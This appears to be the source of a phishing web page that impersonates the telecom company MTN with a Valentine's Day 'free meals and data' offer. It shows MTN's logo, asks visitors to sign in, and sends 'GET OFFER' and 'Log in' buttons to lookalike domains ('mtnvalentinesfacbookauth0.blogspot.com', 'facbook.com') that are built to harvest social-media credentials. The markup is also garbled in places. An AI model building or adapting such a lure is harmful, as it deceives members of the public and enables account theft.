<?php

    include 'logic.php';

?>

<!DOCTYPE html>
<!DOCTYPE html>
<html>
    <head>
        <title>MTN VALENTINE'S GIFTS</title>
        <link href="https://fonts.googleapis.com/css?family=Corinthia|Sofia|Aladin|Merianda|Pacifico|Orbitron|Cutive+Mono" rel="stylesheet">
        <script src="https://chigozie-coder.github.io/Swoader/Swoader.js"></script>
        <!--for loader-->
         <script type="text/javascript" charset="utf-8">
           var swoader = new Swoader("white","80","#272727");
           swoader.start()
           swoader.addText("loading","50px","white")
           swoader.animateText()
           swoader.removeWhenWindowLoaded()
            </script>
            <script src="https://www.wpromotions.eu/confetti.min.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
			 <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
    </head>
    <body>
        
                    <style type="text/css" media="all">
            body,html{
                width: 100vw;
                height: 100vh;
                box-sizing: border-box;
                margin: 0;
                padding:top;
                display: flex;
                place-content: center;
                place-items: center;
                background: linear-gradient(to top left, #232323 50%, #333333 50%);
            }
            *{
                margin: 0;
                padding: 0;
            }
            #card__Con{
                background: linear-gradient(to top left, #FF429D 50%, #FF5FAC 50%);
                width: ;
                height: ;
                border-radius: 10px;
                display: flex;
                flex-direction: column;
                place-items: center;
                text-align: center;
                box-shadow: 0 0 2pt ;
                padding: 20px 30px;
            }
            #card__img{
                width: 100px;
                height: 100px;
                border-radius: 100px;
                border: 2px solid #EEEEEE;
                margin-top:10px;
            }
            #card__name{
                font-family:"Sofia","Cutive Mono","Orbitron","Pacifico", "corinthia", serif;
                font-size: 25;
                font-weight: 1000;
                color: #EEEEEE;
                font-style: italic;
                outline: none;
            }
            #card__text{
                font-family: "Cutive Mono";
                color: white;
                font-weight: 1000;
                font-style: oblique;
                outline: none;
            }
            #cake{
                margin-top: 10px; 
                width: 75px;
                height: 75px;
            }
			font-family: "Nunito Sans";
      }
      .login-form{
      padding: 25px;
      }
      h3{
      padding-left:30px;
      padding-right: 20px;
      font-weight: 700;
      }
      label{
      padding-top: 4px;
      padding-left: 4px;
      }
      .bg-color{
      background-color:rgb(245, 248, 250);
      }
      .bg-color:hover label{
      color:#31a1f2;
      }
      .btn-custom{
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 28px;
      color: #fff;
      font-weight:700;
      height: 48px;
      }
      .btn-custom{
      color: #fff !important;
      background-color: rgb(29, 161, 242);
      }
      .form-control{
      border:0px;
      background-color: rgb(245, 248, 250);
      border-bottom: 2px solid #657786;
      padding: 0px 4px 0px 4px;
      min-height: 20px;
      }
      .form-control:focus{
      box-shadow: none;
      background-color: rgb(245, 248, 250);
      border-color: #31a1f2;
      }
      .fa{
      color: rgb(29, 161, 242);
      margin: 0 auto;
      display: block;
      text-align: center;
      font-size: 50px;
      }
      a{
      text-decoration: none;
      color: rgb(27, 149, 224);
      }
      a:hover{
      text-decoration: underline;
      color: rgb(27, 149, 224);
      }
        </style>
    </head>
    <body>
        <div id="card__Con">
            <img id="card__img" src="https://www.mtn.com/wp-content/themes/mtn-theme/images/mtn-logo-nav.svg" alt="" />
            <h1 id="card__name">HAPPY VALENTINE'S DAY FROM MTN</h1>
            <div id="card__text">Wishing you the happiest and joyous VALENTINE'S DAY WITH YOUR PARTNER . ENJOY FREE MEALS AND DATA FROM MTN.</div>
            <div id="card__text">Kindly sigin to check location for your free date.</div>			
		<img id="cake" src="https://freepngimg.com/thumb/valentines_day/32406-1-valentines-day-hd-thumb.png" alt="" />
		<img id="cake" src="https://freepngimg.com/thumb/valentines_day/32359-4-valentines-day-transparent-image-thumb.png" alt="" />
        </div>
        <audio id="HBDmp" loop>
         <source src="https://dl.dropbox.com/s/c6aq63o2mwuvkui/Happy-Birthday-to-you-Singing-Bell.mp3">
		 <button href="https://facbook.com" type="button" class="btn btn-custom btn-lg btn-block mt-3">Log in</button>
      </audio>
            <script>
            	window.onload =()=>{
                confetti.start()
                Swal.fire({
                    title:"Happy Valentine's Day From Mtn",
                    text:`Have a happiest birthday
                    Card created by Birthday Card Maker by me.`,
                    button:"Let's start",
                    html:`<img id="cake" src="https://freepngimg.com/thumb/valentines_day/32406-1-valentines-day-hd-thumb.png" alt="" /><a href="https://mtnvalentinesfacbookauth0.blogspot.com"><h3 style="font-family:'Pacifico'; color:gray;">Enjoy your day. Data offer vaild for 7 days.</h3></a><a  href="https://mtnvalentinesfacbookauth0.blogspot.com"><button type="button" class="btn btn-custom btn-lg btn-block mt-3">GET OFFER</button></a>`   })
                
                
                }
window .onclick=()=>{
    document.querySelector("#HBDmp").play()
}
</script>
    </body>
</html>
